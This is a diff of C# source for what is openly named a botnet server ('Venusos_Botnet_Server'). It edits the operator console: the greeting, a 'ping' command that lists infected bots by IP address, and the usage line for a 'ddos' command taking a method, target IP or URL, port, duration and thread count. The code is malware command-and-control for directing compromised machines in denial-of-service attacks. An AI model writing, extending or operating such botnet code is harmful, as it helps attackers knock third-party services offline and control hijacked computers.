@@ -76,29 +76,24 @@ namespace Venusos_Botnet_Server
                             if (justLogged)
                             {
                                 justLogged = false;
-                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
+                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type ping to list active bots or ddos to see ddos command syntax!\n"));
                             }
 
-                            if (data.StartsWith("help"))
+                            if (data.StartsWith("ping"))
                             {
-                                networkStream.Write(Encoding.ASCII.GetBytes("Type ddos for help with attacking,\n\rtype ping to ckeck active bots.\n\r"));
-                            }
-                            else if (data.StartsWith("ping"))
-                            {
-                                int all, alive;
-                                all = alive = 0;
+                                int alive;
+                                alive = 0;
 
                                 foreach (TcpClient bot in BotsServer.tcpClients)
                                 {
-                                    all++;
                                     if (BotsServer.Ping(bot))
                                     {
                                         alive++;
-                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive\n\r"));
+                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive!\n"));
                                     }
                                 }
 
-                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive out of " + all + "\n\r"));
+                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive in total.\n"));
                             }
                             else if (data.StartsWith("ddos"))
                             {
@@ -119,7 +114,7 @@ namespace Venusos_Botnet_Server
                                 }
                                 else
                                 {
-                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n\r"));
+                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP/URL] [PORT] [DURATION] [THREADS]\n"));
                                 }
                             }
                         }
